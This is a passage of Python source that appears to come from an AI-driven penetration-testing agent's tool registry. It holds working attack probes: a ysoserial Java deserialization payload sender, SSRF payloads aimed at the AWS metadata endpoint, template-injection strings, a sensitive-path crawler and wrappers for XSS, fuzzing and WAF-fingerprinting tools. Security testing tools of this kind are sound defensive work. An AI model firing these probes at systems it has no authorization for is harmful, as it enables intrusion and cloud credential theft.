                _, stderr_bytes = await asyncio.wait_for(proc.communicate(), timeout=30)
            except asyncio.TimeoutError:
                proc.kill(); await proc.communicate()
                return "ysoserial timed out generating the payload."
            if proc.returncode != 0:
                return f"ysoserial error: {(stderr_bytes or b'').decode(errors='replace')[:500]}"
            payload_size = Path(payload_path).stat().st_size
            if payload_size == 0:
                return "ysoserial produced an empty payload."
            # Deliver the binary payload. Measure round-trip time.
            t0 = time.monotonic()
            cmd = [
                "curl", "-sL", "-m", str(max(SLEEP_SEC + 8, 12)),
                "-X", "POST",
                "-H", "Content-Type: application/octet-stream",
                "--data-binary", f"@{payload_path}",
                "-o", "/dev/null", "-w", "%{http_code}",
                target,
            ]
            stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
            elapsed = time.monotonic() - t0
        finally:
            try: os.unlink(payload_path)
            except OSError: pass
        verdict = (
            f"[CONFIRMED] response delayed {elapsed:.1f}s ≥ sleep {SLEEP_SEC}s — gadget executed"
            if elapsed >= SLEEP_SEC - 0.5
            else f"[NOT CONFIRMED] elapsed {elapsed:.1f}s < expected ≥ {SLEEP_SEC}s; payload not executed by this gadget"
        )
        summary = (
            f"Java deserialization probe for {target}:\n"
            f"  gadget: CommonsCollections1 → sleep {SLEEP_SEC}\n"
            f"  payload size: {payload_size} bytes (binary, AC ED magic)\n"
            f"  curl exit: {rc} HTTP {stdout.strip() or '?'}\n"
            f"  {verdict}\n"
            f"Try other gadgets (Spring1, Hibernate1, etc.) and dnslog OOB if this one missed."
        )
        await _persist(project_id, "deserialization_check", args, summary, "", 0)
        return summary
    elif lang == "php":
        php_payloads = [
            'O:8:"stdClass":0:{}',
            'a:1:{s:4:"test";s:4:"test";}',
        ]
        results = []
        for payload in php_payloads:
            cmd = [
                "curl", "-sL", "-m", "10", "-X", "POST",
                "-d", f"data={payload}", target,
            ]
            stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
            results.append(f"  payload={payload!r} → rc={rc} len={len(stdout)}")
            if "Unserialize" in stdout or "unserialize" in stdout or "Error" in stdout:
                results.append(f"    [NOTE] Deserialization-related response content")
        summary = f"PHP deserialization check for {target}:\n" + "\n".join(results)
        await _persist(project_id, "deserialization_check", args, summary, "", 0)
        return summary
    return f"Error: unsupported lang={lang!r}. Use 'java' or 'php'."


register(
    Tool(
        name="deserialization_check",
        description="Test for insecure deserialization using ysoserial (Java) or PHP unserialize payloads.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "lang": {"type": "string", "description": "Language: java or php (default: java)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _deserialization_check,
)


# ---------------------------------------------------------------------------
# csp_audit — CSP header nonce reuse, SRI, and misconfiguration analysis
# ---------------------------------------------------------------------------

async def _csp_audit(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 30))

    cmd = [
        "curl", "-sL", "-m", str(timeout_s),
        "-D", "-",
        "--user-agent", "Mozilla/5.0 (X11; Linux x86_64) pentesting-agent/1.0",
        target,
    ]
    stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s + 5)
    if rc == -1:
        return stderr

    # With -L curl prints headers for every redirect before the final response.
    # Split on HTTP status lines and take only the LAST block so we parse the
    # final response headers, not an intermediate redirect's headers.
    http_blocks = re.split(r"(?m)^(?=HTTP/[12])", stdout)
    last_block = next((b for b in reversed(http_blocks) if b.strip()), "")

    header_section = []
    body_lines = []
    in_body = False
    for line in last_block.splitlines():
        if line.strip() == "" and not in_body:
            in_body = True
            continue
        if in_body:
            body_lines.append(line)
        else:
            header_section.append(line)

    headers: dict = {}
    for h in header_section:
        if ":" in h:
            k, _, v = h.partition(":")
            headers[k.strip().lower()] = v.strip()

    findings: list[str] = []
    raw_csp = headers.get("content-security-policy", "")

    if not raw_csp:
        findings.append("MISSING: Content-Security-Policy header not present — A05 (security misconfiguration)")
    else:
        findings.append(f"CSP: {raw_csp[:500]}")
        findings.append("")

        # Parse directives
        directives: dict = {}
        for part in raw_csp.split(";"):
            part = part.strip()
            if not part:
                continue
            tokens = part.split()
            directives[tokens[0].lower()] = tokens[1:] if len(tokens) > 1 else []

        # Check for unsafe-inline / unsafe-eval
        script_src = directives.get("script-src", directives.get("default-src", []))
        if "'unsafe-inline'" in script_src:
            findings.append("ISSUE: 'unsafe-inline' in script-src — negates nonce/hash-based XSS protection")
        if "'unsafe-eval'" in script_src:
            findings.append("ISSUE: 'unsafe-eval' in script-src — enables eval() exploitation")

        # Check nonce presence
        nonces = [t for t in script_src if t.startswith("'nonce-")]
        if nonces:
            findings.append(f"NONCE DETECTED: {nonces}")
            # Check for nonce reuse across multiple requests
            findings.append("ACTION REQUIRED: Send 3+ requests and compare nonce values — reused nonces defeat CSP.")
        else:
            findings.append("INFO: No nonce in script-src — check for hash-based policy or unsafe-inline")

        # Check wildcard sources
        wildcards = [t for t in script_src if "*" in t and t != "'nonce-*'"]
        if wildcards:
            findings.append(f"ISSUE: Wildcard script sources detected: {wildcards} — allows loading scripts from any subdomain")

        # Check missing directives
        for missing_dir in ["default-src", "frame-ancestors", "base-uri", "form-action"]:
            if missing_dir not in directives:
                findings.append(f"MISSING directive: {missing_dir}")

        # Check report-uri / report-to
        if "report-uri" not in directives and "report-to" not in directives:
            findings.append("INFO: No report-uri/report-to — CSP violations are silent")

    # SRI check — look for <script> tags without integrity attributes in body
    body = "\n".join(body_lines)
    script_tags = re.findall(r"<script[^>]*src=['\"][^'\"]+['\"][^>]*>", body, re.IGNORECASE)
    no_sri = [t for t in script_tags if "integrity=" not in t.lower()]
    if no_sri:
        findings.append(f"\nSRI MISSING on {len(no_sri)} external script tag(s):")
        for tag in no_sri[:10]:
            findings.append(f"  {tag[:120]}")
        findings.append("RISK: Without SRI, a compromised CDN can inject arbitrary JavaScript.")

    # X-Frame-Options
    xfo = headers.get("x-frame-options", "")
    if not xfo:
        findings.append("\nMISSING: X-Frame-Options — clickjacking risk (use frame-ancestors in CSP instead)")
    else:
        findings.append(f"\nX-Frame-Options: {xfo}")

    result = f"CSP Audit: {target}\n\n" + "\n".join(findings)
    await _persist(project_id, "csp_audit", args, result, "", 0)
    return result


register(
    Tool(
        name="csp_audit",
        description=(
            "Audit Content Security Policy headers for nonce reuse, unsafe-inline/eval, "
            "wildcard sources, missing directives, and SRI gaps on external scripts. "
            "Use after initial http_probe on every web target."
        ),
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
            },
        },
    ),
    _csp_audit,
)


# ---------------------------------------------------------------------------
# pdf_generator_ssrf — probe PDF export endpoints for SSRF via crafted HTML
# ---------------------------------------------------------------------------

async def _pdf_generator_ssrf(args: dict) -> str:
    target = (args.get("target") or "").strip()
    ssrf_callback = (args.get("ssrf_callback") or "http://169.254.169.254/latest/meta-data/").strip()
    field = (args.get("field") or "body").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 30))

    if not target:
        return "Error: target is required."

    # Payloads for PDF generator SSRF / template injection
    payloads = [
        # SSRF via img src
        f'<img src="{ssrf_callback}">',
        # SSRF via iframe
        f'<iframe src="{ssrf_callback}"></iframe>',
        # SSRF via CSS @import
        f'<style>@import url("{ssrf_callback}");</style>',
        # Template injection (Twig/Jinja2)
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
    ]

    results: list[str] = [f"PDF generator SSRF/injection probe: {target}", ""]

    for payload in payloads:
        data = json.dumps({field: payload})
        cmd = [
            "curl", "-sL", "-m", str(timeout_s), "-X", "POST",
            "-H", "Content-Type: application/json",
            "-d", data,
            "-w", "\n--- HTTP %{http_code} size=%{size_download} time=%{time_total}s ---",
            target,
        ]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s + 5)
        resp_snippet = (stdout or stderr)[:300].replace("\n", " ")
        results.append(f"Payload: {payload[:80]!r}")
        results.append(f"  Response: {resp_snippet}")

        # Detect template injection in response
        if "49" in stdout:
            results.append("  [POSSIBLE SSTI] 7*7=49 reflected — template injection signal")
        results.append("")

    results.append("NOTE: Check your out-of-band callback server for incoming HTTP/DNS requests.")
    results.append("If callback fires, SSRF is confirmed. Record as ttp_category='ssrf', severity='high'.")

    result = "\n".join(results)
    await _persist(project_id, "pdf_generator_ssrf", args, result, "", 0)
    return result


register(
    Tool(
        name="pdf_generator_ssrf",
        description=(
            "Probe PDF export / document generation endpoints for SSRF via crafted rich-text HTML "
            "and server-side template injection. Sends img/iframe/CSS payloads and template syntax "
            "to a POST endpoint. Monitor your out-of-band callback server for DNS/HTTP hits."
        ),
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "PDF generation endpoint URL"},
                "ssrf_callback": {"type": "string", "description": "SSRF callback URL to inject (default: AWS metadata)"},
                "field": {"type": "string", "description": "JSON field name to inject into (default: body)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
            },
        },
    ),
    _pdf_generator_ssrf,
)

# ---------------------------------------------------------------------------
# crawler_login — authenticated session crawler
# ---------------------------------------------------------------------------

async def _crawler_login(args: dict) -> str:
    target = args.get("target", "").rstrip("/")
    login_url = args.get("login_url", "")
    username = args.get("username", "")
    password = args.get("password", "")
    project_id = args.get("project_id")
    timeout = int(args.get("timeout", 30))

    if not target:
        return "Error: target is required."

    results = [f"crawler_login: {target}", ""]

    # Step 1 – login and get session cookie
    session_cookie = ""
    login_status = "skipped (no login_url provided)"
    if login_url:
        try:
            post_data = urllib.parse.urlencode({"username": username, "password": password, "email": username}).encode()
            def _do_login(pd=post_data):
                req = urllib.request.Request(login_url, data=pd, method="POST")
                req.add_header("User-Agent", "penligent-crawler/0.1")
                req.add_header("Content-Type", "application/x-www-form-urlencoded")
                opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
                cookies = {}
                with opener.open(req, timeout=timeout) as resp:
                    for h in resp.headers.get_all("Set-Cookie") or []:
                        cookie_part = h.split(";")[0].strip()
                        if "=" in cookie_part:
                            k, v = cookie_part.split("=", 1)
                            cookies[k.strip()] = v.strip()
                    return cookies, f"POST {login_url} → {resp.status}"
            cj, login_status = await asyncio.to_thread(_do_login)
        except Exception as e:
            cj = {}
            login_status = f"Login failed: {e}"

        session_cookie = "; ".join(f"{k}={v}" for k, v in cj.items())
        results.append(f"Login: {login_status}")
        if session_cookie:
            results.append(f"Session cookie: {session_cookie[:80]}{'…' if len(session_cookie) > 80 else ''}")

    # Step 2 – crawl 40 paths with authenticated session
    _PATHS = [
        "/", "/admin", "/admin/", "/api", "/api/v1", "/api/v2",
        "/login", "/logout", "/register", "/dashboard", "/settings",
        "/profile", "/account", "/users", "/user", "/config",
        "/debug", "/test", "/status", "/health", "/metrics",
        "/backup", "/backups", "/upload", "/uploads", "/files",
        "/graphql", "/swagger", "/swagger-ui", "/api-docs",
        "/robots.txt", "/sitemap.xml", "/.env", "/.git/HEAD",
        "/actuator", "/actuator/health", "/actuator/env",
        "/wp-admin", "/wp-login.php", "/phpmyadmin", "/console",
    ]

    results.append("")
    results.append("Authenticated crawl results:")
    interesting = []
    for path in _PATHS:
        url = target + path
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "penligent-crawler/0.1")
        if session_cookie:
            req.add_header("Cookie", session_cookie)
        try:
            def _do_req(r=req):
                with urllib.request.urlopen(r, timeout=timeout) as resp:
                    return resp.status, resp.headers.get("Content-Type", "")[:40], len(resp.read(512))
            code, ct, size = await asyncio.to_thread(_do_req)
            line = f"  {code}  {path:35} {ct}"
            if code in (200, 201) or size > 100:
                interesting.append(line)
            results.append(line)
        except urllib.error.HTTPError as e:
            code = e.code
            line = f"  {code}  {path}"
            if code in (401, 403):
                interesting.append(line)
            results.append(line)
        except Exception:
            results.append(f"  ERR  {path}")

    if interesting:
        results.append("")
        results.append(f"Interesting ({len(interesting)} paths — 200/201/401/403):")
        results.extend(interesting)

    result = "\n".join(results)
    await _persist(project_id, "crawler_login", args, result, "", 0)
    return result


register(
    Tool(
        name="crawler_login",
        description=(
            "Log in with credentials then crawl 40 high-value paths with the authenticated session. "
            "Returns status codes for each path. Call approve_intent(SCAN_ACTIVE) first. "
            "Requires login_url + username + password for the authenticated phase."
        ),
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Base URL of the target (e.g. http://10.10.11.22)"},
                "login_url": {"type": "string", "description": "POST endpoint to authenticate against"},
                "username": {"type": "string", "description": "Username or email for login"},
                "password": {"type": "string", "description": "Password for login"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Per-request timeout in seconds (default 30)"},
            },
        },
    ),
    _crawler_login,
)


# ---------------------------------------------------------------------------
# feroxbuster_scan  — (check_sensitive_paths and auth_replay live in
#                      guardrails.py and utils.py respectively)
# ---------------------------------------------------------------------------

_SENSITIVE_PATHS = [
    "/", "/admin", "/admin/", "/api", "/api/v1", "/api/v2",
    "/login", "/logout", "/register", "/dashboard", "/settings",
    "/profile", "/account", "/users", "/user", "/config",
    "/debug", "/test", "/status", "/health", "/metrics",
    "/backup", "/backups", "/upload", "/uploads", "/files",
    "/graphql", "/swagger", "/swagger-ui", "/api-docs",
    "/robots.txt", "/sitemap.xml", "/.env", "/.git/HEAD",
    "/actuator", "/actuator/health", "/actuator/env",
    "/wp-admin", "/wp-login.php", "/phpmyadmin", "/console",
]


# ---------------------------------------------------------------------------
# feroxbuster_scan  (recursive content discovery)
# ---------------------------------------------------------------------------

async def _feroxbuster_scan(args: dict) -> str:
    url = (args.get("url") or "").strip()
    wordlist = (args.get("wordlist") or "/usr/share/wordlists/dirb/common.txt").strip()
    threads = int(args.get("threads", 10))
    extensions = (args.get("extensions") or "").strip()
    extra = (args.get("additional_args") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 300))

    if not url:
        return "Error: url is required."
    if not shutil.which("feroxbuster"):
        return "Error: feroxbuster not found in PATH. Install: apt install feroxbuster"

    cmd = ["feroxbuster", "-u", url, "-w", wordlist, "-t", str(threads), "--no-state"]
    if extensions:
        cmd += ["-x", extensions]
    if extra:
        cmd += extra.split()

    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "feroxbuster_scan", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"Feroxbuster scan completed for {url} with no results."


register(
    Tool(
        name="feroxbuster_scan",
        description="Recursive directory and file brute-forcing with Feroxbuster. Automatically recurses into discovered directories. Faster than gobuster for deep content discovery.",
        inputSchema={
            "type": "object",
            "required": ["url"],
            "properties": {
                "url": {"type": "string", "description": "Target URL"},
                "wordlist": {"type": "string", "description": "Wordlist path (default: /usr/share/wordlists/dirb/common.txt)"},
                "threads": {"type": "integer", "description": "Concurrent threads (default: 10)"},
                "extensions": {"type": "string", "description": "File extensions to append (e.g. 'php,html,txt')"},
                "additional_args": {"type": "string", "description": "Extra feroxbuster flags (e.g. '--filter-status 404', '--depth 3')"},
                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 300)"},
                "project_id": {"type": "integer"},
            },
        },
    ),
    _feroxbuster_scan,
)


# ---------------------------------------------------------------------------
# dirsearch_scan  (advanced directory and file discovery)
# ---------------------------------------------------------------------------

async def _dirsearch_scan(args: dict) -> str:
    url = (args.get("url") or "").strip()
    extensions = (args.get("extensions") or "php,html,js,txt,xml,json").strip()
    wordlist = (args.get("wordlist") or "").strip()
    threads = int(args.get("threads", 30))
    recursive = bool(args.get("recursive", False))
    extra = (args.get("additional_args") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 300))

    if not url:
        return "Error: url is required."
    if not shutil.which("dirsearch"):
        return "Error: dirsearch not found in PATH. Install: apt install dirsearch"

    cmd = ["dirsearch", "-u", url, "-e", extensions, "-t", str(threads)]
    if wordlist:
        cmd += ["-w", wordlist]
    if recursive:
        cmd.append("-r")
    if extra:
        cmd += extra.split()

    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "dirsearch_scan", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"Dirsearch completed for {url} with no results."


register(
    Tool(
        name="dirsearch_scan",
        description="Advanced web directory brute-forcing with Dirsearch. Supports multiple extensions, recursive scanning, and smart filtering. Good for API endpoint discovery.",
        inputSchema={
            "type": "object",
            "required": ["url"],
            "properties": {
                "url": {"type": "string", "description": "Target URL"},
                "extensions": {"type": "string", "description": "File extensions (default: php,html,js,txt,xml,json)"},
                "wordlist": {"type": "string", "description": "Custom wordlist path"},
                "threads": {"type": "integer", "description": "Threads (default: 30)"},
                "recursive": {"type": "boolean", "description": "Recursive scanning (default: false)"},
                "additional_args": {"type": "string", "description": "Extra dirsearch flags"},
                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 300)"},
                "project_id": {"type": "integer"},
            },
        },
    ),
    _dirsearch_scan,
)


# ---------------------------------------------------------------------------
# katana_crawl  (next-generation web crawler)
# ---------------------------------------------------------------------------

async def _katana_crawl(args: dict) -> str:
    url = (args.get("url") or "").strip()
    depth = int(args.get("depth", 3))
    js_crawl = bool(args.get("js_crawl", True))
    form_extraction = bool(args.get("form_extraction", True))
    extra = (args.get("additional_args") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 120))

    if not url:
        return "Error: url is required."
    if not shutil.which("katana"):
        return "Error: katana not found in PATH. Install: go install github.com/projectdiscovery/katana/cmd/katana@latest"

    cmd = ["katana", "-u", url, "-d", str(depth), "-jsonl"]
    if js_crawl:
        cmd.append("-jc")
    if form_extraction:
        cmd.append("-fx")
    if extra:
        cmd += extra.split()

    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "katana_crawl", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    count = len(stdout.splitlines())
    return f"Crawled {count} URLs from {url}:\n\n{stdout}" if stdout else (stderr or f"No URLs discovered from {url}.")


register(
    Tool(
        name="katana_crawl",
        description="Next-generation web crawling with Katana. Discovers endpoints including JavaScript-rendered content, forms, and API calls. Excellent for mapping attack surface.",
        inputSchema={
            "type": "object",
            "required": ["url"],
            "properties": {
                "url": {"type": "string", "description": "Target URL to crawl"},
                "depth": {"type": "integer", "description": "Crawl depth (default: 3)"},
                "js_crawl": {"type": "boolean", "description": "Enable JavaScript crawling (default: true)"},
                "form_extraction": {"type": "boolean", "description": "Extract form fields (default: true)"},
                "additional_args": {"type": "string", "description": "Extra katana flags"},
                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 120)"},
                "project_id": {"type": "integer"},
            },
        },
    ),
    _katana_crawl,
)


# ---------------------------------------------------------------------------
# gau_urls  (get all URLs from public archives)
# ---------------------------------------------------------------------------

async def _gau_urls(args: dict) -> str:
    domain = (args.get("domain") or "").strip()
    include_subs = bool(args.get("include_subs", True))
    blacklist = (args.get("blacklist") or "png,jpg,gif,jpeg,swf,woff,svg,pdf,css,ico").strip()
    extra = (args.get("additional_args") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 120))

    if not domain:
        return "Error: domain is required."
    if not shutil.which("gau"):
        return "Error: gau not found in PATH. Install: go install github.com/lc/gau/v2/cmd/gau@latest"

    cmd = ["gau", domain]
    if include_subs:
        cmd.append("--subs")
    if blacklist:
        cmd += ["--blacklist", blacklist]
    if extra:
        cmd += extra.split()

    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "gau_urls", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    count = len(stdout.splitlines())
    return f"Discovered {count} historical URLs for {domain}:\n\n{stdout[:5000]}" + ("\n... (truncated)" if len(stdout) > 5000 else "") if stdout else (stderr or "No URLs found.")


register(
    Tool(
        name="gau_urls",
        description="Fetch historical URLs for a domain from Wayback Machine, Common Crawl, OTX, and URLScan using gau (Get All URLs). Great for finding hidden endpoints and forgotten assets.",
        inputSchema={
            "type": "object",
            "required": ["domain"],
            "properties": {
                "domain": {"type": "string", "description": "Target domain (e.g. example.com)"},
                "include_subs": {"type": "boolean", "description": "Include subdomains (default: true)"},
                "blacklist": {"type": "string", "description": "Comma-separated extensions to exclude (default: common static files)"},
                "additional_args": {"type": "string", "description": "Extra gau flags"},
                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 120)"},
                "project_id": {"type": "integer"},
            },
        },
    ),
    _gau_urls,
)


# ---------------------------------------------------------------------------
# waybackurls_discover  (Wayback Machine URL discovery)
# ---------------------------------------------------------------------------

async def _waybackurls_discover(args: dict) -> str:
    domain = (args.get("domain") or "").strip()
    get_versions = bool(args.get("get_versions", False))
    extra = (args.get("additional_args") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 120))

    if not domain:
        return "Error: domain is required."
    if not shutil.which("waybackurls"):
        return "Error: waybackurls not found in PATH. Install: go install github.com/tomnomnom/waybackurls@latest"

    cmd = ["waybackurls", domain]
    if get_versions:
        cmd.append("--get-versions")
    if extra:
        cmd += extra.split()

    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "waybackurls_discover", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    count = len(stdout.splitlines())
    return f"Found {count} archived URLs for {domain}:\n\n{stdout[:5000]}" + ("\n... (truncated)" if len(stdout) > 5000 else "") if stdout else (stderr or "No archived URLs found.")


register(
    Tool(
        name="waybackurls_discover",
        description="Discover historical URLs from the Wayback Machine (archive.org) using waybackurls. Uncovers old endpoints, forgotten APIs, and removed pages.",
        inputSchema={
            "type": "object",
            "required": ["domain"],
            "properties": {
                "domain": {"type": "string", "description": "Target domain (e.g. example.com)"},
                "get_versions": {"type": "boolean", "description": "Also fetch timestamped versions of pages (default: false)"},
                "additional_args": {"type": "string", "description": "Extra waybackurls flags"},
                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 120)"},
                "project_id": {"type": "integer"},
            },
        },
    ),
    _waybackurls_discover,
)


# ---------------------------------------------------------------------------
# arjun_params  (HTTP parameter discovery)
# ---------------------------------------------------------------------------

async def _arjun_params(args: dict) -> str:
    url = (args.get("url") or "").strip()
    method = (args.get("method") or "GET").strip().upper()
    wordlist = (args.get("wordlist") or "").strip()
    threads = int(args.get("threads", 25))
    stable = bool(args.get("stable", False))
    extra = (args.get("additional_args") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 120))

    if not url:
        return "Error: url is required."
    if not shutil.which("arjun"):
        return "Error: arjun not found in PATH. Install: pip install arjun"

    cmd = ["arjun", "-u", url, "-m", method, "-t", str(threads)]
    if wordlist:
        cmd += ["-w", wordlist]
    if stable:
        cmd.append("--stable")
    if extra:
        cmd += extra.split()

    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "arjun_params", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"Arjun found no hidden parameters for {url}."


register(
    Tool(
        name="arjun_params",
        description="HTTP parameter discovery with Arjun. Finds hidden GET/POST/JSON parameters that are not in the HTML. Essential for finding attack surface in APIs.",
        inputSchema={
            "type": "object",
            "required": ["url"],
            "properties": {
                "url": {"type": "string", "description": "Target URL"},
                "method": {"type": "string", "description": "HTTP method: GET, POST, JSON (default: GET)"},
                "wordlist": {"type": "string", "description": "Custom parameter wordlist"},
                "threads": {"type": "integer", "description": "Concurrent threads (default: 25)"},
                "stable": {"type": "boolean", "description": "Use stable mode (slower but more accurate, default: false)"},
                "additional_args": {"type": "string", "description": "Extra arjun flags"},
                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 120)"},
                "project_id": {"type": "integer"},
            },
        },
    ),
    _arjun_params,
)


# ---------------------------------------------------------------------------
# hakrawler_crawl  (fast web endpoint discovery)
# ---------------------------------------------------------------------------

async def _hakrawler_crawl(args: dict) -> str:
    url = (args.get("url") or "").strip()
    depth = int(args.get("depth", 2))
    extra = (args.get("additional_args") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 120))

    if not url:
        return "Error: url is required."
    if not shutil.which("hakrawler"):
        return "Error: hakrawler not found in PATH. Install: go install github.com/hakluke/hakrawler@latest"

    # hakrawler reads URLs from stdin (v2+ interface)
    proc = await asyncio.create_subprocess_exec(
        "hakrawler", "-d", str(depth),
        *(extra.split() if extra else []),
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout_b, stderr_b = await asyncio.wait_for(
            proc.communicate(input=url.encode()),
            timeout=timeout_s,
        )
    except asyncio.TimeoutError:
        proc.kill()
        await proc.communicate()
        return f"Hakrawler timed out after {timeout_s}s."

    stdout = stdout_b.decode(errors="replace")
    stderr = stderr_b.decode(errors="replace")
    exit_code = proc.returncode if proc.returncode is not None else 0

    await _persist(project_id, "hakrawler_crawl", args, stdout, stderr, exit_code)
    count = len(stdout.splitlines())
    return f"Discovered {count} endpoints for {url}:\n\n{stdout}" if stdout else (stderr or "No endpoints found.")


register(
    Tool(
        name="hakrawler_crawl",
        description="Fast web endpoint discovery with Hakrawler. Crawls a site and extracts URLs, forms, JavaScript files, and endpoints. Useful for quick attack surface mapping.",
        inputSchema={
            "type": "object",
            "required": ["url"],
            "properties": {
                "url": {"type": "string", "description": "Target URL to crawl"},
                "depth": {"type": "integer", "description": "Crawl depth (default: 2)"},
                "additional_args": {"type": "string", "description": "Extra hakrawler flags (e.g. '-subs' for subdomains)"},
                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 120)"},
                "project_id": {"type": "integer"},
            },
        },
    ),
    _hakrawler_crawl,
)


# ---------------------------------------------------------------------------
# dalfox_xss  (advanced XSS scanner)
# ---------------------------------------------------------------------------

async def _dalfox_xss(args: dict) -> str:
    url = (args.get("url") or "").strip()
    mining_dom = bool(args.get("mining_dom", True))
    mining_dict = bool(args.get("mining_dict", True))
    custom_payload = (args.get("custom_payload") or "").strip()
    extra = (args.get("additional_args") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 120))

    if not url:
        return "Error: url is required."
    if not shutil.which("dalfox"):
        return "Error: dalfox not found in PATH. Install: go install github.com/hahwul/dalfox/v2@latest"

    cmd = ["dalfox", "url", url]
    if mining_dom:
        cmd.append("--mining-dom")
    if mining_dict:
        cmd.append("--mining-dict")
    if custom_payload:
        cmd += ["--custom-payload", custom_payload]
    if extra:
        cmd += extra.split()

    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "dalfox_xss", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"Dalfox XSS scan completed for {url} with no findings."


register(
    Tool(
        name="dalfox_xss",
        description="Advanced XSS vulnerability scanning with Dalfox. Mines DOM-based XSS, reflects, and parameter-based XSS. Smarter than basic XSS scanners with context-aware payloads.",
        inputSchema={
            "type": "object",
            "required": ["url"],
            "properties": {
                "url": {"type": "string", "description": "Target URL (include FUZZ marker in params, e.g. ?q=FUZZ)"},
                "mining_dom": {"type": "boolean", "description": "Mine DOM-based XSS (default: true)"},
                "mining_dict": {"type": "boolean", "description": "Mine parameters from dictionary (default: true)"},
                "custom_payload": {"type": "string", "description": "Custom XSS payload to test"},
                "additional_args": {"type": "string", "description": "Extra dalfox flags (e.g. '--blind your.xss.ht')"},
                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 120)"},
                "project_id": {"type": "integer"},
            },
        },
    ),
    _dalfox_xss,
)


# ---------------------------------------------------------------------------
# wafw00f_detect  (WAF detection and fingerprinting)
# ---------------------------------------------------------------------------

async def _wafw00f_detect(args: dict) -> str:
    target = (args.get("target") or "").strip()
    find_all = bool(args.get("find_all", False))
    extra = (args.get("additional_args") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))

    if not target:
        return "Error: target is required."
    if not shutil.which("wafw00f"):
        return "Error: wafw00f not found in PATH. Install: pip install wafw00f"

    cmd = ["wafw00f", target]
    if find_all:
        cmd.append("-a")
    if extra:
        cmd += extra.split()

    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "wafw00f_detect", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"wafw00f completed for {target}."


register(
    Tool(
        name="wafw00f_detect",
        description="Detect and fingerprint Web Application Firewalls (WAF) with wafw00f. Identifies the WAF vendor and type to plan bypass strategies.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL (e.g. http://example.com)"},
                "find_all": {"type": "boolean", "description": "Test for all known WAFs, not just the first detected (default: false)"},
                "additional_args": {"type": "string", "description": "Extra wafw00f flags"},
                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 60)"},
                "project_id": {"type": "integer"},
            },
        },
    ),
    _wafw00f_detect,
)


# ---------------------------------------------------------------------------
# wfuzz_scan  (web application fuzzer)
# ---------------------------------------------------------------------------

async def _wfuzz_scan(args: dict) -> str:
    url = (args.get("url") or "").strip()
    wordlist = (args.get("wordlist") or "/usr/share/wordlists/dirb/common.txt").strip()
    filter_code = (args.get("filter_code") or "").strip()
    extra = (args.get("additional_args") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 120))

    if not url:
